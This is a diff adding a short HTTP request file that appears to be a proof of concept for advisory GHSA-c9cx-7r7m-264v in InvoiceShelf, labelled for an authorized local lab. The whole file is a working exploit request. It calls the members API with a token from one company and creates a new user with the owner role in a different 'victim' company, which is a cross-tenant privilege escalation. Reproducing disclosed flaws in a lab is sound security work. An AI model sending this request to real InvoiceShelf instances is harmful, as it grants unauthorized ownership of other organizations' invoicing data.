@@ -1,0 +1,27 @@
+### GHSA-c9cx-7r7m-264v — authorized local laboratory only
+### Replace variables with values from an isolated InvoiceShelf test instance.
+
+@baseUrl = http://127.0.0.1:8080
+@token = LAB_TOKEN
+@activeCompanyId = 1
+@victimCompanyId = 2
+
+POST {{baseUrl}}/api/v1/members
+Authorization: Bearer {{token}}
+company: {{activeCompanyId}}
+Content-Type: application/json
+Accept: application/json
+
+{
+  "name": "Authorized Lab PoC",
+  "email": "poc-user@example.invalid",
+  "phone": null,
+  "password": "Lab-PoC-Only-Change-Me!",
+  "companies": [
+    {
+      "id": {{victimCompanyId}},
+      "role": "owner"
+    }
+  ]
+}
+
